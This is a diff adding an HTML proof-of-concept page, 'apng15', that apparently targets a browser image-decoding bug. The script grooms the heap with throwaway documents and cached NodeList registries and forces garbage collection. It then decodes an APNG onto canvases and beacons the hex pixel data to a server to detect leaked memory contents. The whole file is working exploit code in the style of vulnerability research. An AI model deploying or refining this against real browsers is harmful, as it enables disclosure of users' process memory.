@@ -1,0 +1,58 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng15</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function gcf(n){ for(var i=0;i<(n||8);i++){ var a=new ArrayBuffer(4*1024*1024); a=null; } }
+function hex(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
+function mk(w){ var c=document.createElement('canvas'); c.width=w; c.height=1; return c; }
+function dump(tag,w,im){ var c=mk(w); var g=c.getContext('2d'); g.drawImage(im,0,0);
+  var d=g.getImageData(0,0,w,1).data; b(tag+'-'+hex(d,w)); }
+var b64=null;
+
+// registry groom: secondary documents whose NodeList registries fill a HashSet, then die
+function groomRegistries(nDocs,nLists){
+  var keep=[];
+  for(var i=0;i<nDocs;i++){
+    var d=document.implementation.createHTMLDocument();
+    d.body.innerHTML='<div>'+new Array(40).join('<p>x</p>')+'</div>';
+    for(var j=0;j<nLists;j++){
+      var l=d.getElementsByTagName('div');   // registers a CachedHTMLCollection at d
+      l[0];                                   // forces willValidateIndexCache
+      keep.push(l);
+    }
+    keep.push(d.body);
+  }
+  return keep;
+}
+function groomStrings(n){
+  var keep=[];
+  for(var i=0;i<n;i++){ var s=''; for(var j=0;j<63;j++) s+=String.fromCharCode(65+(j%26)); keep.push(s+(''+i)); }
+  return keep;
+}
+function arm(tag,groom){
+  var keep=groom();
+  keep=null;                        // drop the documents so their registries can be freed
+  gcf(10);
+  setTimeout(function(){
+    var im=new Image();
+    im.onload=function(){
+      dump(tag+'-W64',64,im);
+      dump(tag+'-W128',128,im);
+      gcf(4);
+      b(tag+'-END');
+    };
+    im.onerror=function(){ b(tag+'-ERR'); };
+    im.src='data:image/png;base64,'+b64;
+  }, 0);
+}
+function boot(){
+  b('P15-BOOT');
+  fetch('/corpus/apng-fw1.png?r='+Date.now()).then(function(r){return r.arrayBuffer();}).then(function(ab){
+    var u=new Uint8Array(ab), s=''; for(var i=0;i<u.length;i++) s+=String.fromCharCode(u[i]);
+    b64=btoa(s); b('P15-B64-'+b64.length);
+    arm('P15-A', function(){ return null; });                       // control: no groom
+    setTimeout(function(){ arm('P15-B', function(){ return groomRegistries(30,12); }); }, 3000);
+    setTimeout(function(){ arm('P15-C', function(){ return groomRegistries(60,20); }); }, 6000);
+    setTimeout(function(){ b('P15-DONE'); }, 9000);
+  });
+}
+window.addEventListener('load',boot);
+</script></head><body><p>apng15</p></body></html>
